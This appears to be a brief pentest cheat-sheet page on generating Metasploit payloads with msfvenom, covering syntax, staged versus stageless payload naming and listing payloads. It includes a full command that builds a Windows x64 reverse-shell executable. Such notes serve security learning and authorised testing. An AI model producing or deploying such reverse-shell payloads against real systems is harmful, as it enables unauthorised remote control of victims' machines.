# Payload

### Generating

{% code title="Basic" overflow="wrap" %}
```shell
msfvenom -p <PAYLOAD> <OPTIONS>
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# to generate a Windows x64 Reverse Shell in an exe format

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
{% endcode %}



### Naming

#### Base

```bash
<OS>/<arch>/<payload>

# EX: x86 linux
linux/x86/shell_reverse_tcp

# EX: Windows 32bit
windows/shell_reverse_tcp
```

#### Staged or Stageless?

```bash
# Stageless standard naming(using '_') :
linux/x86/shell_reverse_tcp

# Staged standard naimng(using '/') :
linux/x86/shell/reverse_tcp
```



### List of Payloads

```bash
msfvenom --list payloads
```
